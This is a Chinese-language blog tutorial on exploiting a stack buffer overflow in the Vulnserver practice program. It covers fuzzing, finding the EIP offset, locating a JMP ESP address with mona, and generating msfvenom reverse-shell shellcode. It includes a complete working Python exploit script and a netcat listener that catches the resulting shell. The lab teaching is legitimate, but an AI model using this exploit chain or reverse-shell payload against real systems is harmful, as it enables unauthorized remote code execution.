# 用简单易懂的话语来快速入门windows的缓冲区溢出教程
准备工具
```
immunity debugger ：https://www.immunityinc.com/products/debugger/   ##WINDOWS的程序动态调试工具
Vulnserver ： https://github.com/stephenbradshaw/vulnserver   ##练习缓冲区溢出的程序
```
这两个工具都要下载到windows的机子上，攻击机为kali

# 什么是缓冲区溢出攻击
在程序运行时，系统会为程序在内存里生成一个固定空间，如果超过了这个空间，就会造成缓冲区溢出，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，甚至可以取得系统特权，进而进行各种非法操作。

# 运行程序
下载安装好immunity debugger后，我们双击打开，然后将Vulnserver.EXE拖入immunity debugger
![在这里插入图片描述](https://img-blog.csdnimg.cn/d9e541ee30f746b19cdf15d13d8b1105.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3870a053f25a4c848110ef7dbd2d530b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
成功拖入了程序，我们双击上方任务栏的开始键，让程序开始运行
![在这里插入图片描述](https://img-blog.csdnimg.cn/53488972cb2b49788e41685bb508378d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
这个程序是用来练习缓冲区溢出的，在本地的9999端口上运行
# kali连接Vulnserver 
我们可以使用netcat这个工具来连接Vulnserver，netcat简称nc，可以在两台设备上面相互交互
```
nc -nv 靶机ip 9999     ##连接靶机上的9999端口，因为Vulnserver默认运行在9999端口，-n 以数字形式表示的IP地址，-v 显示详细信息
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/60d9a8c78e49465d982c1940b09b5d65.png)
它让我们输入help来获取详细信息，我们输入大写的HELP
![在这里插入图片描述](https://img-blog.csdnimg.cn/88adcb0dc69b409487a1a9d8d3e669f3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
这里出现了几个函数，其中有一个有缓冲区溢出漏洞，我们用模糊测试一个一个试

# 缓冲区溢出FUZZ模糊测试
缓冲区溢出模糊测试是你不知道这个空间有多大时而使用的技术，来测试程序在内存空间里大概有多大的空间
kali里有专门测试缓冲区溢出模糊测试的工具，叫做generic_send_tcp，他可以根据一个简单的脚本，来测试程序是否会有缓冲区溢出漏洞
我们写一个简单的脚本
```
readline();        ##接受服务器的数据
s_string("TRUN ");     ##发送TRUN这个字符，测试TRUN这个函数有没有缓冲区溢出漏洞
s_string_variable("0");   ##发送的主体字符串，0
```
然后保存为.spk文件，我一个一个试了Vulnserver的函数，只有TRUN这个函数有漏洞，用其他的函数，运行工具后Vulnserver不会有任何反应，只有运行TRUN这个函数时，Vulnserver会报错崩溃
在kali的终端里输入
```
generic_send_tcp 靶机IP 9999 stats.spk 0 0    ##用generic_send_tcp对靶机模糊测试，后面的那两个0是这个工具固定的参数
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5a643bae503f482a813bed5a21ccce6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
我们去看看靶机上的程序有什么反应
![在这里插入图片描述](https://img-blog.csdnimg.cn/19090fd75bed471e995da72340486e5e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)

程序报错终止了，说明有缓冲区溢出的漏洞

# 找出程序空间有多大
我们需要使用metasploit里的一个工具，他可以生成一长串不同的字符来测试程序空间有多大
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000   ##这个模块是用来测试程序空间有多大的，-l是要生成字符的长度，3000的字符长度即可
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e9f1c144b8274104a7676b61d89a1e84.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
如何我们需要写一个python的小脚本来发送我们的数据
```
#!/usr/bin/python     ##声明文件是用python运行的
import sys       ##导入python的sys模块，这是系统模块，可以使终端运行命令
import socket    ##导入python的socket模块，这是python通信模块，可以和服务器上的程序交互，接受数据

buff="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
##测试程序空间有多大的字符
while True:       ##循环
        try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)      ##使用socket模块来交互程序，用ipv4，TCP协议
                s.connect(('192.168.211.128',9999))       ##连接程序，ip和端口号

                s.send(('TRUN /.:/' + buff))     ##来发送我们模糊测试的字符串
                s.close()      ##发送后关闭和程序的连接

	except:
                print "error server"    ##发送失败
                sys.exit()    ##退出程序
```
命名保存为.py文件，然后我们给这个程序权限
```
chmod +x buff.py     ## x 赋予程序运行的权限
```
然后去到靶机上，将immunity debugger关闭再双击打开，然后将Vulnserver.EXE拖入immunity debugger，然后双击开始运行，重复一次上面的操作，因为程序崩溃了，要重新运行才行

成功运行Vulnserver后，我们回到kali里，因为我们在程序的第一行声明文件是用python运行的，所以我们可以直接运行文件
```
./buff.py
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/559be35e5a5141d787c63200abe09da4.png)
运行后我们去靶机上看看
![在这里插入图片描述](https://img-blog.csdnimg.cn/dee35f62872048b6aa0e019a5f0c592c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
程序成功报错终止运行，接下来，我要讲解immunity debugger这四个窗口界面分别是什么
```
左上角：反汇编窗口，有地址，机器码，机器码对应的汇编指令，注释。
右上角：寄存器窗口，显示程序寄存器的值
左下角：内存窗口，显示内存地址里的值
右下角：堆栈窗口，显示显示调用的堆栈和解码后的函数参数
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0abe64e7621648ed8e081074053cea58.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
目前只需要知道这四个窗口的名称是什么即可，其他的之后会讲解
回到程序报错的界面
![在这里插入图片描述](https://img-blog.csdnimg.cn/931cb2555b094357a1ead2ced29f758b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)

寄存器的功能是存储二进制代码，不同的寄存器有不同的作用，这里，我们要认识一个很重要的寄存器，他叫做EIP，在64位程序里叫做RIP，他是程序的指针，指针就是寻找地址的，指到什么地址，就会运行该地址的参数，控制了这个指针，就能控制整个程序的运行，我们可以看到，图中EIP寄存器的参数是386F4337，很明显，我们用一大堆不同的字符覆盖了EIP原本的参数，还记得缓冲区溢出是什么吗，就是大量的字符溢出原本固定的空间后，覆盖了很多程序寄存器原本的正常的值，所以会报错崩溃
我们回到kali，查找386F4337这个字符在3000个字符里的第几个,我们还是要用metasploit里的一个工具，他能找到386F4337这个字符在3000个字符里的第几个
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337   ##-l 字符长度 -q 寻找
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/431561d981814bfe9b401dba0bf04669.png)
这里我们看到是第2003个字符，程序的空间就是2003个字符长度，知道了空间大小，我们就能控制EIP来执行我们想要执行的参数，比如拿到靶机权限

# 寻找可控的指令
回到靶机，这里，我们需要一个py文件，他可以帮助我们快速找到没有防护的dll文件，可以让我们调用dll里的参数，帮助我们拿到靶机权限
```
下载地址：https://github.com/corelan/mona
```
然后将mona.py放到\Immunity Debugger\PyCommands下，然后将immunity debugger关闭再双击打开，然后将Vulnserver.EXE拖入immunity debugger，然后双击开始运行，重复一次上面的操作，因为程序崩溃了，要重新运行才行

![在这里插入图片描述](https://img-blog.csdnimg.cn/093c434decc14faca2c93cd80a1ff594.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
打开immunity debugger后，在下面的输入框中输入
```
!mona modules
```
然后我们会跳到一个新窗口里
![在这里插入图片描述](https://img-blog.csdnimg.cn/90c79373f74f49089516abec3885ca7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
我们要寻找防护都是关闭状态的程序，即全是false
![在这里插入图片描述](https://img-blog.csdnimg.cn/dd266fd0dd1d46d3bac4771434cba96c.png)
第二行有一个防护全是关闭的dll文件，叫做essfunc.dll
在汇编语言里，有一个指令叫做jmp，它能跳转到指定的地址，我们可以把EIP的值换成jmp指令存在的地址，然后跳到我们想要执行代码的地方，有一个重要的寄存器叫做ESP，它存放的参数是程序空间最大的地址，回到kali，用metasploit将jmp和ESP的操作码找到
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```
然后输入JMP ESP
![在这里插入图片描述](https://img-blog.csdnimg.cn/d9e8abb015f0497cac89b8b07f292185.png)
转换成十六进制就是
```
\xff\xe4
```
然后我们在essfunc.dll里找一下有没有这个参数
```
!mona find -s "\xff\xe4" -m essfunc.dll
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b247ea785c044c4ab064b60cb5b053d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
这些地址都可以用，我们随意选择一个，0x625011af，在x86架构里，读取地址是由低到高的，所以是\xaf\x11\x50\x62,下一步写最终的脚本有用
回到kali，我们用msfvenom生成一段x86架构能运行的shellcode代码，来拿到靶机权限
```
msfvenom -p windows/shell_reverse_tcp LHOST=本地ip LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
-f  输出形式为c语言
-a  架构为x86
-b  取消指定的十六进制参数，\x00在操作码里是空指令，所以我们要排除\x00
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2fd2a3e16d764f9e807097ec96c21836.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们做一个最终的脚本
```
!/usr/bin/python
import sys
import socket

shellcode = ("\xdb\xc6\xbd\xbd\xf8\x2f\x34\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xef\xfc\x31\x6f\x13\x03\xd2\xeb\xcd\xc1\xd0\xe4\x90"
"\x2a\x28\xf5\xf4\xa3\xcd\xc4\x34\xd7\x86\x77\x85\x93\xca\x7b"
"\x6e\xf1\xfe\x08\x02\xde\xf1\xb9\xa9\x38\x3c\x39\x81\x79\x5f"
"\xb9\xd8\xad\xbf\x80\x12\xa0\xbe\xc5\x4f\x49\x92\x9e\x04\xfc"
"\x02\xaa\x51\x3d\xa9\xe0\x74\x45\x4e\xb0\x77\x64\xc1\xca\x21"
"\xa6\xe0\x1f\x5a\xef\xfa\x7c\x67\xb9\x71\xb6\x13\x38\x53\x86"
"\xdc\x97\x9a\x26\x2f\xe9\xdb\x81\xd0\x9c\x15\xf2\x6d\xa7\xe2"
"\x88\xa9\x22\xf0\x2b\x39\x94\xdc\xca\xee\x43\x97\xc1\x5b\x07"
"\xff\xc5\x5a\xc4\x74\xf1\xd7\xeb\x5a\x73\xa3\xcf\x7e\xdf\x77"
"\x71\x27\x85\xd6\x8e\x37\x66\x86\x2a\x3c\x8b\xd3\x46\x1f\xc4"
"\x10\x6b\x9f\x14\x3f\xfc\xec\x26\xe0\x56\x7a\x0b\x69\x71\x7d"
"\x6c\x40\xc5\x11\x93\x6b\x36\x38\x50\x3f\x66\x52\x71\x40\xed"
"\xa2\x7e\x95\xa2\xf2\xd0\x46\x03\xa2\x90\x36\xeb\xa8\x1e\x68"
"\x0b\xd3\xf4\x01\xa6\x2e\x9f\xed\x9f\xe3\xde\x86\xdd\x03\xf0"
"\x0a\x6b\xe5\x98\xa2\x3d\xbe\x34\x5a\x64\x34\xa4\xa3\xb2\x31"
"\xe6\x28\x31\xc6\xa9\xd8\x3c\xd4\x5e\x29\x0b\x86\xc9\x36\xa1"
"\xae\x96\xa5\x2e\x2e\xd0\xd5\xf8\x79\xb5\x28\xf1\xef\x2b\x12"
"\xab\x0d\xb6\xc2\x94\x95\x6d\x37\x1a\x14\xe3\x03\x38\x06\x3d"
"\x8b\x04\x72\x91\xda\xd2\x2c\x57\xb5\x94\x86\x01\x6a\x7f\x4e"
"\xd7\x40\x40\x08\xd8\x8c\x36\xf4\x69\x79\x0f\x0b\x45\xed\x87"
"\x74\xbb\x8d\x68\xaf\x7f\xad\x8a\x65\x8a\x46\x13\xec\x37\x0b"
"\xa4\xdb\x74\x32\x27\xe9\x04\xc1\x37\x98\x01\x8d\xff\x71\x78"
"\x9e\x95\x75\x2f\x9f\xbf")    ##我们要执行的shellcode代码

buff = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 16 + shellcode       ##2003个字符将程序空间全部覆盖，然后用0x625011af覆盖EIP来运行我们想做的操作，x90的操作码是NOP，简单解释就是覆盖地址后程序无操作,防止程序报错停止运行

while True:
        try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('靶机IP',9999))

                s.send(('TRUN /.:/' + buff))
                s.close()

        except:
                print "error server" 
                sys.exit()

```
回到靶机，我们关闭掉immunity debugger，然后双击直接运行Vulnserver 
![在这里插入图片描述](https://img-blog.csdnimg.cn/31c877bdda5847e68e0712ecec00046b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
再回到kali，新打开一个终端，我们使用netcat去监听刚刚msfvenom里刚刚输入的监听端口
```
nc -nvlp 4444
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c2b837de9ae64b319f0c78859374b7c7.png)
我们赋予我们脚本权限
```
chmod +x buff2.py
```
然后再运行我们新写的脚本
```
./buff2.py
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5696fc93530a42e58035ad73155913d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/09aad9f54cd84f0ebeaab021eb45c615.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
成功拿到权限，手写了三个小时，用最简单易懂的方式来写缓冲区溢出的教程，有很多专业术语我都没用，如果你对这些感兴趣，可以专门去学习，写文章不易，欢迎大家关注我
